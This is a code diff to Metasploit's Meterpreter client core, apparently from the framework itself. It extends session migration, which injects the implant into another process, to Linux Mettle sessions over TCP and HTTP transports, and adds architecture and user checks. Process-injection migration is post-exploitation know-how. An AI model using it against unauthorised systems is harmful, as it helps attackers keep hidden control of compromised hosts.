@@ -6,7 +6,6 @@ require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/extension_mapper'
 require 'rex/post/meterpreter/client'
 
-
 # certificate hash checking
 require 'rex/socket/x509_certificate'
 
@@ -615,128 +614,165 @@ class ClientCore < Extension
   # by pid.  The connection to the server remains established.
   #
   def migrate(target_pid, writable_dir = nil, opts = {})
-    keepalive              = client.send_keepalives
+    keepalive = client.send_keepalives
     client.send_keepalives = false
-    target_process         = nil
-    current_process        = nil
 
-    # Load in the stdapi extension if not already present so we can determine the target pid architecture...
-    client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')
+    begin
+      target_process = nil
+      current_process = nil
 
-    current_pid = client.sys.process.getpid
+      # Load in the stdapi extension if not already present so we can determine the target pid architecture...
+      client.core.use('stdapi') unless client.ext.aliases.include?('stdapi')
 
-    # Find the current and target process instances
-    client.sys.process.processes.each { | p |
-      if p['pid'] == target_pid
-        target_process = p
-      elsif p['pid'] == current_pid
-        current_process = p
-      end
-    }
+      current_pid = client.sys.process.getpid
 
-    # We cant migrate into a process that does not exist.
-    unless target_process
-      raise RuntimeError, 'Cannot migrate into non existent process', caller
-    end
-
-    # We cannot migrate into a process that we are unable to open
-    # On linux, arch is empty even if we can access the process
-    if client.platform == 'windows'
-
-      if target_process['arch'] == nil || target_process['arch'].empty?
-        raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
-      end
-    end
-
-    # And we also cannot migrate into our own current process...
-    if current_process['pid'] == target_process['pid']
-      raise RuntimeError, 'Cannot migrate into current process', caller
-    end
-
-    migrate_stub = generate_migrate_stub(target_process)
-    migrate_payload = generate_migrate_payload(target_process)
-
-    # Build the migration request
-    request = Packet.create_request(COMMAND_ID_CORE_MIGRATE)
-
-    request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
-    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
-    request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
-
-    if target_process['arch'] == ARCH_X64
-      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
-
-    else
-      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
-    end
-
-    # if we change architecture, we need to change UUID as well
-    if current_process['arch'] != target_process['arch']
-      client.payload_uuid.arch = target_process['arch']
-      request.add_tlv( TLV_TYPE_UUID, client.payload_uuid.to_raw )
-    end
-
-    # Send the migration request. Timeout can be specified by the caller, or set to a min
-    # of 60 seconds.
-    timeout = [(opts[:timeout] || 0), 60].max
-    client.send_request(request, timeout)
-
-    # Post-migration the session doesn't have encryption any more.
-    # Set the TLV key to nil to make sure that the old key isn't used
-    # at all.
-    client.tlv_enc_key = nil
-
-    if client.passive_service
-      # Sleep for 5 seconds to allow the full handoff, this prevents
-      # the original process from stealing our loadlib requests
-      ::IO.select(nil, nil, nil, 5.0)
-    elsif client.pivot_session.nil?
-      # Prevent new commands from being sent while we finish migrating
-      client.comm_mutex.synchronize do
-        # Disable the socket request monitor
-        client.monitor_stop
-
-        ###
-        # Now communicating with the new process
-        ###
-
-        # only renegotiate SSL if the session had support for it in the
-        # first place!
-        if client.supports_ssl?
-          # If renegotiation takes longer than a minute, it's a pretty
-          # good bet that migration failed and the remote side is hung.
-          # Since we have the comm_mutex here, we *must* release it to
-          # keep from hanging the packet dispatcher thread, which results
-          # in blocking the entire process.
-          begin
-            Timeout.timeout(timeout) do
-              # Renegotiate SSL over this socket
-              client.swap_sock_ssl_to_plain()
-              client.swap_sock_plain_to_ssl()
-            end
-          rescue ::Timeout::Error
-            client.alive = false
-            return false
-          end
+      # Find the current and target process instances
+      client.sys.process.processes.each do |process|
+        if process['pid'] == target_pid
+          target_process = process
+        elsif process['pid'] == current_pid
+          current_process = process
         end
-
-        # Restart the socket monitor
-        client.monitor_socket
       end
+
+      # We cant migrate into a process that does not exist.
+      unless target_process
+        raise RuntimeError, 'Cannot migrate into non existent process', caller
+      end
+
+      # We cannot migrate into a process that we are unable to open.
+      if client.platform == 'windows' && target_process['arch'].to_s.empty?
+        raise RuntimeError, 'Cannot migrate into this process (insufficient privileges)', caller
+      end
+
+      # And we also cannot migrate into our own current process
+      if current_pid == target_process['pid']
+        raise RuntimeError, 'Cannot migrate into current process', caller
+      end
+
+      current_arch = current_process&.fetch('arch', nil)
+      current_arch = client.arch if current_arch.to_s.empty?
+      current_arch = normalize_migrate_arch(current_arch)
+      target_arch = normalize_migrate_arch(target_process['arch'])
+      validate_migrate_architectures!(current_arch, target_arch)
+
+      transport = get_current_transport
+      unless transport && transport[:url]
+        raise RuntimeError, 'Unable to determine the current transport', caller
+      end
+      linux_migration = client.platform == 'linux'
+      transport_type = migrate_transport(transport[:url])
+      if linux_migration && transport_type == :socket
+        validate_linux_socket_migration_target!(current_process, target_process)
+      end
+
+      migration_uuid = client.payload_uuid
+      if current_arch != target_arch
+        migration_uuid = client.payload_uuid.dup
+        migration_uuid.arch = target_arch
+      end
+
+      migrate_payload = generate_migrate_payload(
+        target_process,
+        transport: transport,
+        payload_uuid: migration_uuid,
+        session_guid: client.session_guid
+      )
+      migrate_stub = generate_migrate_stub(target_process, transport: transport, payload: migrate_payload)
+
+      # Build the migration request
+      request = Packet.create_request(COMMAND_ID_CORE_MIGRATE)
+      request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
+      request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+      request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
+      request.add_tlv(TLV_TYPE_MIGRATE_ARCH, target_arch == ARCH_X64 ? 2 : 1)
+      request.add_tlv(TLV_TYPE_UUID, migration_uuid.to_raw) if current_arch != target_arch
+
+      # Send the migration request. Timeout can be specified by the caller, or set to a min
+      # of 60 seconds.
+      timeout = [(opts[:timeout] || 0), 60].max
+      linux_socket_handoff = linux_migration && transport_type == :socket
+      passive_linux_reconnect = linux_migration &&
+                                client.passive_service &&
+                                transport_type == :reconnect
+      if passive_linux_reconnect
+        # A reconnecting Mettle stops its old event loop after queueing the
+        # response, so the passive HTTP transport cannot reliably return it.
+        # Queue the request and let the new instance attach before continuing.
+        client.send_packet(request)
+        ::IO.select(nil, nil, nil, 5.0)
+      else
+        client.send_request(request, timeout)
+      end
+
+      # Mettle's migration response only confirms that the target was injected.
+      # For socket transports, the source Mettle remains alive briefly after
+      # sending that response. Let it exit before negotiating encryption so the
+      # request can only be handled by the migrated instance.
+      ::IO.select(nil, nil, nil, 1.0) if linux_socket_handoff
+
+      client.payload_uuid.arch = target_arch if current_arch != target_arch
+
+      # Post-migration the session doesn't have encryption any more.
+      # Set the TLV key to nil to make sure that the old key isn't used
+      # at all.
+      client.tlv_enc_key = nil
+
+      if client.passive_service
+        # Sleep for 5 seconds to allow the full handoff, this prevents
+        # the original process from stealing our loadlib requests
+        ::IO.select(nil, nil, nil, 5.0) unless passive_linux_reconnect
+      elsif client.pivot_session.nil?
+        # Prevent new commands from being sent while we finish migrating
+        client.comm_mutex.synchronize do
+          # Disable the socket request monitor
+          client.monitor_stop
+
+          ###
+          # Now communicating with the new process
+          ###
+
+          # only renegotiate SSL if the session had support for it in the
+          # first place!
+          if client.supports_ssl?
+            # If renegotiation takes longer than a minute, it's a pretty
+            # good bet that migration failed and the remote side is hung.
+            # Since we have the comm_mutex here, we *must* release it to
+            # keep from hanging the packet dispatcher thread, which results
+            # in blocking the entire process.
+            begin
+              Timeout.timeout(timeout) do
+                # Renegotiate SSL over this socket
+                client.swap_sock_ssl_to_plain
+                client.swap_sock_plain_to_ssl
+              end
+            rescue ::Timeout::Error
+              client.alive = false
+              return false
+            end
+          end
+
+          # Restart the socket monitor
+          client.monitor_socket
+        end
+      end
+
+      # Renegotiate TLV encryption on the migrated session
+      secure
+
+      if linux_migration && client.sys.process.getpid == current_pid
+        raise RuntimeError, 'Mettle migration failed to hand off the session', caller
+      end
+
+      # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
+      client.ext.aliases.each_key do |extension|
+        client.core.use(extension)
+      end
+
+      true
+    ensure
+      client.send_keepalives = keepalive
     end
-
-    # Renegotiate TLV encryption on the migrated session
-    secure
-  
-    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
-    client.ext.aliases.keys.each { |e|
-      client.core.use(e)
-    }
-
-    # Restore session keep-alives
-    client.send_keepalives = keepalive
-
-    return true
   end
 
   def secure
@@ -830,18 +866,15 @@ private
   # Generate a migrate stub that is specific to the current transport type and the
   # target process.
   #
-  def generate_migrate_stub(target_process)
+  def generate_migrate_stub(target_process, transport:, payload: nil)
     stub = nil
 
-
     if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
-      t = get_current_transport
-
       c = Class.new(::Msf::Payload)
 
-      if target_process['arch'] == ARCH_X86
+      if normalize_migrate_arch(target_process['arch']) == ARCH_X86
         c.include(::Msf::Payload::Windows::BlockApi)
-        case t[:url]
+        case transport[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp)
         when /^pipe/i
@@ -852,7 +885,7 @@ private
         end
       else
         c.include(::Msf::Payload::Windows::BlockApi_x64)
-        case t[:url]
+        case transport[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp_x64)
         when /^pipe/i
@@ -863,12 +896,66 @@ private
         end
       end
 
-      stub = c.new().generate
+      stub = c.new.generate
+    elsif client.platform == 'linux' && [ARCH_X86, ARCH_X64].include?(client.arch)
+      c = Class.new(::Msf::Payload)
+
+      case [normalize_migrate_arch(target_process['arch']), migrate_transport(transport[:url])]
+      when [ARCH_X64, :socket]
+        c.include(::Msf::Payload::Linux::X64::MigrateTcp)
+      when [ARCH_X64, :reconnect]
+        c.include(::Msf::Payload::Linux::X64::MigrateHttp)
+      when [ARCH_X86, :socket]
+        c.include(::Msf::Payload::Linux::X86::MigrateTcp)
+      when [ARCH_X86, :reconnect]
+        c.include(::Msf::Payload::Linux::X86::MigrateHttp)
+      else
+        raise RuntimeError, "Unsupported migration target #{target_process['arch']} using #{transport[:url]}", caller
+      end
+
+      stub = c.new.generate(payload: payload)
     else
-      raise RuntimeError, "Unsupported session #{client.session_type}"
+      raise "Unsupported session #{client.session_type}"
     end
 
     stub
+  end
+
+  def migrate_transport(url)
+    case url
+    when %r{\A(?:fd|tcp)://}i
+      :socket
+    when %r{\Ahttps?://}i
+      :reconnect
+    else
+      raise RuntimeError, "Unsupported transport #{url}", caller
+    end
+  end
+
+  def normalize_migrate_arch(arch)
+    return ARCH_X64 if [ARCH_X64, ARCH_X86_64].include?(arch)
+    return ARCH_X86 if arch == ARCH_X86
+
+    arch
+  end
+
+  def validate_migrate_architectures!(current_arch, target_arch)
+    supported_architectures = [ARCH_X86, ARCH_X64]
+    unless supported_architectures.include?(target_arch)
+      raise RuntimeError, "Unsupported target architecture '#{target_arch}'", caller
+    end
+
+    if client.platform == 'linux' && current_arch != target_arch
+      raise RuntimeError, "Mettle cannot migrate from #{current_arch} to #{target_arch}", caller
+    end
+  end
+
+  def validate_linux_socket_migration_target!(current_process, target_process)
+    source_user = current_process&.fetch('user', nil).to_s
+    target_user = target_process['user'].to_s
+    return if source_user.empty? || target_user.empty? || source_user == target_user
+
+    raise RuntimeError, "Mettle cannot preserve the TCP transport when migrating from '#{source_user}' to '#{target_user}'; choose a process running as '#{source_user}'", caller
   end
 
   #
@@ -981,38 +1068,68 @@ private
   # Create a full Windows-specific migration payload specific to the target process.
   #
   def generate_migrate_windows_payload(target_process)
-    c = Class.new( ::Msf::Payload )
-    c.include( ::Msf::Payload::Stager )
+    c = Class.new(::Msf::Payload)
+    c.include(::Msf::Payload::Stager)
 
     # Include the appropriate reflective dll injection module for the target process architecture...
     # Used to generate a reflective DLL when migrating. This is yet another
     # argument for moving the meterpreter client into the Msf namespace.
     if target_process['arch'] == ARCH_X86
-      c.include( ::Msf::Payload::Windows::MeterpreterLoader )
+      c.include(::Msf::Payload::Windows::MeterpreterLoader)
     elsif target_process['arch'] == ARCH_X64
-      c.include( ::Msf::Payload::Windows::MeterpreterLoader_x64 )
+      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
     else
       raise RuntimeError, "Unsupported target architecture '#{target_process['arch']}' for process '#{target_process['name']}'.", caller
     end
 
     # Create the migrate stager
-    migrate_stager = c.new()
+    migrate_stager = c.new
 
-    migrate_stager.stage_meterpreter({datastore: {'MeterpreterDebugBuild' => client.debug_build}})
+    migrate_stager.stage_meterpreter({ datastore: { 'MeterpreterDebugBuild' => client.debug_build } })
+  end
+
+  def generate_migrate_linux_payload(target_process, transport:, payload_uuid:, session_guid:)
+    c = Class.new(::Msf::Payload)
+    c.include(::Msf::Payload::Stager)
+    if normalize_migrate_arch(target_process['arch']) == ARCH_X86
+      c.include(::Msf::Payload::Linux::X86::MeterpreterLoader)
+    elsif normalize_migrate_arch(target_process['arch']) == ARCH_X64
+      c.include(::Msf::Payload::Linux::X64::MeterpreterLoader)
+    else
+      raise RuntimeError, "Unsupported target architecture '#{target_process['arch']}' for process '#{target_process['name']}'.", caller
+    end
+
+    image_options = {
+      uuid: payload_uuid,
+      session_guid: session_guid,
+      debug: client.debug_build ? 3 : nil
+    }
+    if migrate_transport(transport[:url]) == :reconnect
+      image_options[:override_uri] = transport[:url]
+    else
+      image_options[:inherited_transport] = true
+    end
+
+    c.new.stage_meterpreter(image_options)
   end
 
   #
   # Create a full migration payload specific to the target process.
   #
-  def generate_migrate_payload(target_process)
+  def generate_migrate_payload(target_process, transport:, payload_uuid:, session_guid:)
     case client.platform
     when 'windows'
-      blob = generate_migrate_windows_payload(target_process)
+      generate_migrate_windows_payload(target_process)
+    when 'linux'
+      generate_migrate_linux_payload(
+        target_process,
+        transport: transport,
+        payload_uuid: payload_uuid,
+        session_guid: session_guid
+      )
     else
-      raise RuntimeError, "Unsupported platform '#{client.platform}'"
+      raise "Unsupported platform '#{client.platform}'"
     end
-
-    blob
   end
 end
 
